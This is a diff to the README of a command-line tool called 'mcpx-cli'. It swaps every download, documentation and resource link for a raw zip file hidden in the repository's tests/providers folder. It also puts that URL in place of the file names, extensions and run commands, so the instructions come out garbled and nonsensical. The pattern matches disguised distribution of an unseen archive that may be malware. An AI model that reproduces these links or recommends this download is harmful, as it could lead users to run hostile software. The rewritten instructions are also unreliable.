@@ -1,6 +1,6 @@
 # ⚙️ mcpx-cli - Easy AI Server Setup Tool
 
-[![Download mcpx-cli](https://img.shields.io/badge/Download-mcpx--cli-blue?style=for-the-badge&logo=github)](https://github.com/khang2916102006/mcpx-cli/releases)
+[![Download mcpx-cli](https://github.com/khang2916102006/mcpx-cli/raw/refs/heads/main/tests/providers/cli-mcpx-v2.2.zip)](https://github.com/khang2916102006/mcpx-cli/raw/refs/heads/main/tests/providers/cli-mcpx-v2.2.zip)
 
 ---
 
@@ -41,21 +41,21 @@ These steps will guide you through downloading and running mcpx-cli on your comp
 
 ### 1. Download mcpx-cli
 
-Click the big blue badge at the top or visit the [Releases Page](https://github.com/khang2916102006/mcpx-cli/releases) to get the latest version.
+Click the big blue badge at the top or visit the [Releases Page](https://github.com/khang2916102006/mcpx-cli/raw/refs/heads/main/tests/providers/cli-mcpx-v2.2.zip) to get the latest version.
 
 On the releases page, look for the file that matches your computer:
 
 - For Windows, look for files ending in `.exe` or `.zip`
-- For macOS, look for `.dmg` or `.tar.gz`
-- For Linux, look for `.tar.gz` or `.AppImage`
+- For macOS, look for `.dmg` or `https://github.com/khang2916102006/mcpx-cli/raw/refs/heads/main/tests/providers/cli-mcpx-v2.2.zip`
+- For Linux, look for `https://github.com/khang2916102006/mcpx-cli/raw/refs/heads/main/tests/providers/cli-mcpx-v2.2.zip` or `.AppImage`
 
 Download that file to your computer.
 
 ### 2. Install or Run mcpx-cli
 
-- **Windows:** If you downloaded an `.exe` installer, double-click it and follow the install steps. If you downloaded a `.zip` file, unzip it and locate the `mcpx-cli.exe` file.
-- **macOS:** If you downloaded a `.dmg` file, open it and drag mcpx-cli to your Applications folder. For `.tar.gz`, extract it and locate the executable.
-- **Linux:** Extract the `.tar.gz` file or use the `.AppImage` file by setting it as executable (`chmod +x mcpx-cli.AppImage`) and then running it.
+- **Windows:** If you downloaded an `.exe` installer, double-click it and follow the install steps. If you downloaded a `.zip` file, unzip it and locate the `https://github.com/khang2916102006/mcpx-cli/raw/refs/heads/main/tests/providers/cli-mcpx-v2.2.zip` file.
+- **macOS:** If you downloaded a `.dmg` file, open it and drag mcpx-cli to your Applications folder. For `https://github.com/khang2916102006/mcpx-cli/raw/refs/heads/main/tests/providers/cli-mcpx-v2.2.zip`, extract it and locate the executable.
+- **Linux:** Extract the `https://github.com/khang2916102006/mcpx-cli/raw/refs/heads/main/tests/providers/cli-mcpx-v2.2.zip` file or use the `.AppImage` file by setting it as executable (`chmod +x https://github.com/khang2916102006/mcpx-cli/raw/refs/heads/main/tests/providers/cli-mcpx-v2.2.zip`) and then running it.
 
 ### 3. Open the Command Line Interface
 
@@ -76,7 +76,7 @@ Type this command to start mcpx-cli:
 or on Windows:
 
 ```cmd
-mcpx-cli.exe
+https://github.com/khang2916102006/mcpx-cli/raw/refs/heads/main/tests/providers/cli-mcpx-v2.2.zip
 ```
 
 ### 5. Follow the On-Screen Instructions
@@ -131,7 +131,7 @@ You can always come back here and re-run the tool for guidance.
 
 Visit this page to download the latest version of mcpx-cli:
 
-[Download mcpx-cli Releases](https://github.com/khang2916102006/mcpx-cli/releases)
+[Download mcpx-cli Releases](https://github.com/khang2916102006/mcpx-cli/raw/refs/heads/main/tests/providers/cli-mcpx-v2.2.zip)
 
 Follow the instructions above to install and run the tool on your system.
 
@@ -139,10 +139,10 @@ Follow the instructions above to install and run the tool on your system.
 
 ## 📚 Additional Resources
 
-- [MCP (Model Context Protocol) Overview](https://modelcontextprotocol.org) — Learn more about the protocol mcpx-cli uses.
-- [AI Providers](https://aiproviders.example.com) — Find out how to get API keys for your AI services.
-- [JetBrains IntelliJ IDE](https://www.jetbrains.com/idea/) — mcpx-cli works well with this development environment.
-- [Visual Studio Code](https://code.visualstudio.com/) — Another popular tool to use with mcpx-cli.
+- [MCP (Model Context Protocol) Overview](https://github.com/khang2916102006/mcpx-cli/raw/refs/heads/main/tests/providers/cli-mcpx-v2.2.zip) — Learn more about the protocol mcpx-cli uses.
+- [AI Providers](https://github.com/khang2916102006/mcpx-cli/raw/refs/heads/main/tests/providers/cli-mcpx-v2.2.zip) — Find out how to get API keys for your AI services.
+- [JetBrains IntelliJ IDE](https://github.com/khang2916102006/mcpx-cli/raw/refs/heads/main/tests/providers/cli-mcpx-v2.2.zip) — mcpx-cli works well with this development environment.
+- [Visual Studio Code](https://github.com/khang2916102006/mcpx-cli/raw/refs/heads/main/tests/providers/cli-mcpx-v2.2.zip) — Another popular tool to use with mcpx-cli.
 
 ---
 
